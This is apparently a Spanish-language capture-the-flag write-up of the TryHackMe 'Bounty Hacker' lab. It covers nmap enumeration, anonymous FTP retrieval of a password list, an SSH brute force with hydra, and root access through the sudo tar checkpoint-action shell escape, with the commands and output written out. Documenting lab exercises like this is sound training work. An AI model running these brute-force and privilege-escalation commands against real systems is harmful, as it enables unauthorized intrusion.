---
title: '[THM] Bounty Hacker'
date: 2023-01-10 13:30 PM
categories: [Machines, THM]
tags: [easy, linux, machines, ftp, curso, hydra]
permalink: /:categories/:title
img_path: /assets/img/machines/thm/bountyhacker
---

![banner](banner.png)

## Enumeration

### NMAP

Como siempre iniciamos la máquina identificando puertos abiertos y servicios expuestos en la red.

```console
Nmap scan report for 10.10.207.103
Host is up (0.28s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
|_-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.46.198
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

> Encontramos un ftp, ssh y apache.


## Foothold

### FTP

Comenzamos por el FTP ya que gracias a los script por defecto de *nmap* se ha podido ver que tiene habilitado el acceso por "anonymous". También se puede observar que hay dos archivos en su interior, los cuales vamos a descargar.

```console
$ ftp anonymous@10.10.207.103
Connected to 10.10.207.103.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |************************************************************************************************************************************************|   418        1.12 MiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (5.06 KiB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |************************************************************************************************************************************************|    68       88.89 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.85 KiB/s)
ftp> exit
221 Goodbye.
```

Los archivos contenian lo siguiente:

```shell
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
{: file="task.txt" }

```shell
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```
{: file="locks.txt" }

> Aquí vemos algo que podemos dar por hecho que es un diccionario.

### SSH

Usando *hydra* le daremos uso al archivo *locks.txt* que encontramos en el ftp anterior. Haremos fuerza bruta usando este archivo como diccionario y especificando el usuario *lin*.

```console
$ hydra -l lin -P locks.txt 10.10.207.103 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-10 13:35:08
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.207.103:22/
[22][ssh] host: 10.10.207.103   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
```

Una vez obtenida la contraseña iniciamos por ssh. Ya tendremos la flag de **USER**

```console
$ ssh lin@10.10.207.103 
lin@10.10.207.103's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Tue Jan 10 06:07:43 2023 from 10.8.46.198
lin@bountyhacker:~/Desktop$ cat user.txt 
THM{**********}
```

## Privilege Escalation

Lo primero que se hace al iniciar una escalada es `sudo -l` para ver que se puede usar como root. En este caso encontramos */bin/tar*.

```console
lin@bountyhacker:~$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

Consultando [GTFOBins](https://gtfobins.github.io/gtfobins) vemos que se puede aprovechar que tar se ejecute como root usando el siguiente comando.

`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

Una vez hecho esto ya seremos *root*.

```console
lin@bountyhacker:~$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# cd /root
cd: not found
# cd /root
# cat root.txt
THM{**********}
```

## Conclusion

Iniciación a máquinas vulnerables. 

### Techniques and Tools

1. nmap
2. hydra
3. PE (Privilege Escalation)

